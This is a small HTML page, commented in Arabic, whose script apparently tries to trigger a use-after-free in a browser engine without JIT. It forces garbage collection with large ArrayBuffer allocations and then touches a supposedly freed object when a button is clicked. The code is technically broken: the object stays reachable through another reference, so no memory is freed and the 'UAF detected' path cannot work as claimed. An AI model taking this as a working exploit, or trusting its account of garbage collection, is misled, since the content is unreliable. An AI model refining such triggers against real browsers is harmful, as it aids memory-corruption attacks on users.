<!DOCTYPE html>
<html>
<head>
    <script>
        function triggerUAFWithoutJIT() {
            console.log("Attempting to trigger UAF without JIT...");

            // الخطوة 1: إنشاء كائن مع مرجع
            let obj = { prop: 42 };
            let condition = { object: obj, property: "prop" };

            // محاكاة سلوك watchpoint يدويًا
            let watchpoint = {
                fire: function() {
                    try {
                        console.log("Firing on:", condition.object.prop);
                    } catch (e) {
                        console.log("UAF detected:", e.message);
                        alert("UAF detected: " + e.message);
                    }
                }
            };

            // الخطوة 2: تخصيص ذاكرة كبيرة لتحفيز GC
            function forceGC() {
                let largeArray = new Array(10000);
                for (let i = 0; i < 10000; i++) {
                    largeArray[i] = new ArrayBuffer(1024); // تخصيص صغير لتجنب الحدود
                }
                obj = null; // إفساح المجال لجمع القمامة
                if (typeof gc === "function") gc(); // إذا كان متاحًا
                return largeArray;
            }
            forceGC();

            // الخطوة 3: محاولة تفعيل الـ watchpoint بعد تدمير الكائن
            setTimeout(() => {
                watchpoint.fire(); // محاولة الوصول بعد GC
            }, 100); // تأخير للسماح بجمع القمامة
        }
    </script>
</head>
<body>
    <button onclick="triggerUAFWithoutJIT()">Trigger UAF Test</button>
</body>
</html>